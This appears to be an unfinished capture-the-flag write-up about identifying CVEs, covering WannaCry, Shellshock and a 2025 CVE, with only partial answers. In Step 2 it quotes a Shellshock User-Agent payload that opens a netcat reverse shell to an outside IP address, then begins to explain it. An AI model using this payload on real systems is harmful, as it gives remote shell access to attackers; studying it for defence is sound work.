- NIST CVE Database

## 🚀 Solution:

### Step 1:
A security incident has just occurred on the company network! You are the only one with the skills to understand what is happening. To complete the challenge, answer the following questions.

A pop-up named "WanaDecrypt0r 2.0" has opened on user workstations! Provide the primary CVE identifier associated with this software.
```
First 
```


### Step 2:
On one of the Linux web servers, the following User-Agent is found in the Apache logs: `() { :;}; /bin/bash -c 'nc 9.9.9.9 6789 -e /bin/sh'`. What is the CVE identifier associated with this attack?
```
I instantly recognised the payload, particularly the first part "() { :;};" this was part of the shellshock family of known security bugs in bash which was a vulnerability discovered in september of 2014 and it enabled a malicious actor to have the ability to execute arbitrary commands and gain access to systems that used bash. 

Now, the above payload does the following:
"()" creates a function with "{...}" as its content. 
```
Step 3

The identifier CVE-2025-54576 targets a specific software program; provide its name in lowercase.
